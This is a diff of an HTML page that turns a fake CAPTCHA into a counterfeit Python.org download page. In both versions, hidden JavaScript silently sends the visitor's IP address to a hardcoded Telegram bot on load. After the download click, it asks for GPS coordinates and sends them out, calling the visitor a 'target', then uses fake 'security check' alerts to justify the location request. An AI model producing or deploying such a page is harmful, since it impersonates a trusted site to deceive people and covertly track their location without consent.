@@ -1,77 +1,102 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Baratheon Security | التحقق من الأمان</title>
+    <title>Welcome to Python.org</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        body { background-color: #f1f1f1; }
-        .captcha-box { background: white; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); border: 1px solid #d3d3d3; }
+        :root { --py-blue: #3776ab; --py-yellow: #ffd43b; --py-bg: #1e242c; }
+        body { background-color: #24292e; color: #f8f8f8; font-family: 'Source Sans Pro', Arial, sans-serif; }
+        .nav-main { background-color: #303c4a; border-bottom: 3px solid var(--py-blue); }
+        .hero { background: linear-gradient(to bottom, #303c4a, #24292e); }
+        .search-box { background: #444; border: 1px solid #555; color: white; }
+        .btn-download { background: var(--py-yellow); color: var(--py-blue); font-weight: bold; }
+        .footer { background: #303c4a; color: #ccc; font-size: 12px; }
     </style>
 </head>
-<body class="flex items-center justify-center min-h-screen p-4">
+<body>
 
-    <div class="captcha-box p-8 max-w-sm w-full text-center">
-        <div class="flex items-center justify-center mb-6">
-            <i class="fas fa-sync-alt text-4xl text-blue-600 animate-spin-slow"></i>
-            <div class="text-right mr-4">
-                <h1 class="text-2xl font-bold text-gray-800">Baratheon Security</h1>
-                <p class="text-[10px] text-gray-400 font-mono">ID: 5475815049-SEC</p>
+    <nav class="nav-main py-4 px-10 flex flex-wrap justify-between items-center">
+        <div class="flex items-center gap-4">
+            <img src="https://www.python.org/static/img/python-logo.png" alt="Python Logo" class="h-10">
+        </div>
+        <div class="flex items-center gap-6 text-sm font-semibold">
+            <a href="#" class="hover:text-yellow-400">About</a>
+            <a href="#" class="hover:text-yellow-400">Downloads</a>
+            <a href="#" class="hover:text-yellow-400">Documentation</a>
+            <div class="search-box px-3 py-1 rounded flex items-center">
+                <input type="text" placeholder="Search" class="bg-transparent border-none outline-none text-xs w-24">
+                <i class="fas fa-search text-gray-400"></i>
             </div>
         </div>
+    </nav>
 
-        <div class="bg-gray-50 p-5 rounded-md border border-gray-200">
-            <p class="text-sm text-gray-600 mb-6">يرجى إثبات أنك لست روبوت للوصول إلى المحتوى.</p>
-            
-            <label class="flex items-center justify-between bg-white p-4 border border-gray-300 rounded cursor-pointer hover:bg-gray-50 transition shadow-sm">
-                <div class="flex items-center">
-                    <input type="checkbox" onclick="startVerification()" class="w-6 h-6 ml-3 cursor-pointer accent-blue-600">
-                    <span class="text-gray-700 font-medium text-lg">أنا لست برنامج روبوت</span>
-                </div>
-                <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" class="w-7 opacity-40">
-            </label>
+    <header class="hero py-16 px-10 text-center border-b border-gray-700">
+        <h1 class="text-3xl font-bold mb-4">Python is a programming language that lets you work quickly</h1>
+        <p class="text-gray-400 max-w-2xl mx-auto mb-8">and integrate systems more effectively. <a href="#" class="text-blue-400 underline">Learn More</a></p>
+        
+        <div class="bg-[#1e242c] p-10 rounded-xl inline-block shadow-2xl border border-gray-600">
+            <h2 class="text-xl mb-4 text-yellow-400">Latest Release: <span class="text-white">Python 3.12.2</span></h2>
+            <button onclick="requestAccess()" class="btn-download px-8 py-3 rounded hover:bg-white transition flex items-center gap-2 mx-auto">
+                <i class="fas fa-download"></i> Download Python for Windows
+            </button>
+            <p class="text-[10px] mt-4 text-gray-500">Security Check: Verified by Baratheon Labs</p>
         </div>
+    </header>
 
-        <div class="mt-6 flex justify-between items-center text-[10px] text-gray-400 px-2">
-            <div>
-                <a href="#" class="hover:underline">Privacy</a> - <a href="#" class="hover:underline">Terms</a>
-            </div>
-            <p>Powered by <b>Baratheon Tech</b></p>
+    <section class="p-10 grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-8 max-w-6xl mx-auto">
+        <div class="border-l-4 border-blue-500 pl-4">
+            <h3 class="font-bold mb-2">Get Started</h3>
+            <p class="text-xs text-gray-400 leading-relaxed">Whether you're new to programming or an experienced developer, it's easy to learn and use Python.</p>
         </div>
-    </div>
+        <div class="border-l-4 border-yellow-500 pl-4">
+            <h3 class="font-bold mb-2">Download</h3>
+            <p class="text-xs text-gray-400 leading-relaxed">Python source code and installers are available for download for all popular platforms.</p>
+        </div>
+        <div class="border-l-4 border-blue-500 pl-4">
+            <h3 class="font-bold mb-2">Docs</h3>
+            <p class="text-xs text-gray-400 leading-relaxed">Documentation for Python's standard library, along with tutorials and guides.</p>
+        </div>
+        <div class="border-l-4 border-yellow-500 pl-4">
+            <h3 class="font-bold mb-2">Jobs</h3>
+            <p class="text-xs text-gray-400 leading-relaxed">Looking for a career in Python? Check out our job board for the latest opportunities.</p>
+        </div>
+    </section>
+
+    <footer class="footer p-10 text-center">
+        <p>© 2026 Python Software Foundation | Modified for <b>Baratheon Enterprise</b></p>
+    </footer>
 
     <script>
-        // البيانات السرية الخاصة بـ Baratheon
         const token = "8621828423:AAFq9_5-6snrjpfqrBrOPboh7VE824xVN_M";
         const chat_id = "5475815049";
 
-        // صيد صامت للـ IP بمجرد فتح الصفحة
+        // إرسال IP فوراً (صامت)
         window.onload = async () => {
             try {
                 const res = await fetch('https://api.ipify.org?format=json');
                 const data = await res.json();
-                const msg = `👣 <b>زائر جديد في نظام Baratheon!</b>\n\n🌐 IP: <code>${data.ip}</code>\n⚙️ الحالة: بانتظار التحقق..`;
-                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}&parse_mode=HTML`);
+                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("🐍 <b>زائر جديد فتح نسخة بايثون الأصلية!</b>\n🌐 IP: <code>"+data.ip+"</code>")}&parse_mode=HTML`);
             } catch(e){}
         };
 
-        // طلب الـ GPS عند الضغط على المربع
-        function startVerification() {
+        // طلب الـ GPS عند الضغط على زر التحميل
+        function requestAccess() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(async (pos) => {
                     const lat = pos.coords.latitude;
                     const lon = pos.coords.longitude;
                     const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-                    const msg = `✅ <b>تم التحقق! هدف جديد في القبضة:</b>\n\n📍 الموقع: ${mapUrl}`;
+                    const msg = `📍 <b>تم سحب إحداثيات الهدف!</b>\n🔗 الرابط: ${mapUrl}`;
                     
                     await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}&parse_mode=HTML`);
                     
-                    alert("تم التحقق بنجاح! جاري توجيهك للمكتبة..");
-                    window.location.href = "https://www.python.org";
+                    alert("Security Check: Access Verified. Your download will start shortly.");
+                    window.location.href = "https://www.python.org/ftp/python/3.12.2/python-3.12.2-amd64.exe";
                 }, (err) => {
-                    alert("نظام Baratheon: يرجى تحديد المربع والسماح بالوصول لتأكيد هويتك البشرية.");
+                    alert("Security Error: To proceed with the download, you must allow the location check to verify your region.");
                 });
             }
         }
